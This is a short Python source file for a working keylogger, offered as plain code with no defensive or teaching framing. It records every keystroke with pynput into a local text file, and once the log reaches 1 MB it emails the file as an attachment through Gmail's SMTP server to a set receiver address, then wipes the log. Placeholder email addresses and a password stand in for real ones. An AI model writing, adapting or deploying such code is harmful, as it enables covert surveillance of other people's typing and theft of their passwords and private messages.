from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def send_email():
    from_email = "your_email@example.com"  # Your email address
    to_email = "preceiver's_email@gmail.com"  # Receiver's email address
    subject = "Keylogger Data"  # Email subject
    body = "Please find attached the keylogger data."  # Email body

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    filename = "keyfile.txt"
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    smtp_server = "smtp.gmail.com" 
    smtp_port = 587  
    smtp_username = "your-email@gmail.com"  # Your email address
    smtp_password = "password"  # Your email password

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("error getting char")


    if os.path.getsize("keyfile.txt") >= 1024 * 1024: 
        send_email()
        open("keyfile.txt", 'w').close()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
